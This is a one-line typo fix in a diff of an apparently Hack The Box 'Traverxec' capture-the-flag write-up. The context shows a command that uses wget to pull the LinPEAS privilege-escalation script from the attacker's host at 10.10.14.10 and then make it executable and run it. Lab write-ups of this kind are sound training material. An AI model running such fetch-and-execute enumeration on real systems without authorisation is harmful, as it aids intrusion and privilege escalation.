@@ -144,7 +144,7 @@ wget 10.10.14.10:8000/linpeas.sh
 ```
 ![Linpeas](/images/traverxec/linpeas-wget.png)
 
-Now that we have Linpeas, we use `chmod +x` to make it an executable and then `.\linpeas.sh` to run it.
+Now that we have Linpeas, we use `chmod +x` to make it an executable and then `./linpeas.sh` to run it.
 
 ![Linpeas](/images/traverxec/linpeas.png)
 
